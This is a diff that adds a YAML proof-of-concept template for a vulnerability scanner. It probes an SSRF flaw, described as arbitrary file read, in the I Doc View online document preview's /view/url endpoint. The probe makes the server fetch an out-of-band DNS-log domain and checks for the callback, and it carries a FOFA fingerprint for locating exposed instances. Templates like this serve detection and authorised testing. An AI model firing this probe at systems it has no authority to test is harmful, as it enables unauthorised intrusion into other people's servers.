@@ -1,0 +1,21 @@
+id: poc-yaml-idocv-view-url-anyfile-read
+info:
+  name: I Doc View在线文档预览/view/url存在SSRF任意文件读取漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: I Doc View
+  fofa: I Doc View在线文档预览
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /view/url?url=http://{{.reverseDomain}}
+  expression: 'status_code == 200 &&
+
+    reverse.Verify()
+
+    '
+transport: http
